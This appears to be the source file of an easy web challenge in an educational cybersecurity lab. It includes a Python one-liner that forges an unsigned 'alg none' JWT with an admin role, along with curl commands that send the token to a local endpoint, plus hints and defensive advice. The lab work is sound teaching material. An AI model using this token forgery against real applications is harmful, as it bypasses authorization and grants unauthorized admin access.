"""web-session: change an unsigned JWT role claim to forge an admin session."""

from __future__ import annotations

from typing import List, Tuple

from cyberlab import targets
from cyberlab.challenges import Challenge, register
from cyberlab.workspace import Workspace


class WebSession(Challenge):
    def setup(self, ws: Workspace) -> str:
        port = targets.start(ws, "webapp")
        return (f"Target: http://127.0.0.1:{port}/session\n"
                "Inspect the session cookie, change its role claim to admin, and compare "
                "the unsigned and signature-checked endpoints.")

    def snippets(self, ws: Workspace) -> List[Tuple[str, str]]:
        url = f"http://127.0.0.1:{targets.port_of(ws, 'webapp')}"
        forge = (
            "TOKEN=$(python3 -c 'import base64,json,time; "
            "e=lambda x:base64.urlsafe_b64encode(x).rstrip(b\"=\").decode(); "
            "h=e(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"},"
            "separators=(\",\",\":\")).encode()); "
            "p=e(json.dumps({\"iss\":\"northwind\",\"sub\":\"alice\",\"role\":\"admin\","
            "\"exp\":int(time.time())+3600},separators=(\",\",\":\")).encode()); "
            "print(h+\".\"+p+\".\")')"
        )
        return [
            ("Inspect the issued session cookie and its readable JWT claims",
             f"curl -i {url}/session"),
            ("Forge an unsigned admin claim in this local lab",
             f"{forge}\ncurl -i -H \"Cookie: nw_auth=$TOKEN\" {url}/session"),
            ("The fixed endpoint rejects the unsigned token",
             f"curl -i -H \"Cookie: nw_auth=$TOKEN\" {url}/secure/session"),
        ]


register(WebSession(
    id="web-session",
    title="Session tampering: forge an unsigned JWT role",
    track="web",
    difficulty="easy",
    goal=("Change the role in the provided JWT to reach the admin page, then see why "
          "the same unsigned token fails when the endpoint verifies its signature."),
    hints=[
        "A JWT has three dot-separated parts. The middle part is base64url-encoded JSON, "
        "not encrypted.",
        "The vulnerable route trusts the role claim without checking who signed the token.",
        "Set the header algorithm to none, change role to admin, and leave the signature empty.",
    ],
    tools=["curl", "Python"],
    learned=("You changed the role claim in a JWT and the vulnerable endpoint treated it "
             "as an administrator session because it never verified the signature."),
    real_world=("If an application trusts unsigned or incorrectly verified session claims, "
                "a user can alter their own role and bypass authorization. A JWT payload "
                "is encoded, not encrypted, so it must never hold secrets."),
    defend=[
        "Use a maintained JWT library and allowlist the expected signing algorithm.",
        "Verify the signature, issuer, audience, and expiry before trusting any claim.",
        "Keep signing keys secret, high-entropy, and outside client-controlled storage.",
        "Use HttpOnly, Secure (under HTTPS), and SameSite cookie attributes; these reduce "
        "cookie theft and cross-site request risks but do not replace signature checks.",
    ],
    ap_unit="Unit 4",
    ap_topic="4.2 Authentication",
    ap_skill=["Analyze Risk", "Mitigate Risk", "Detect Attacks"],
))
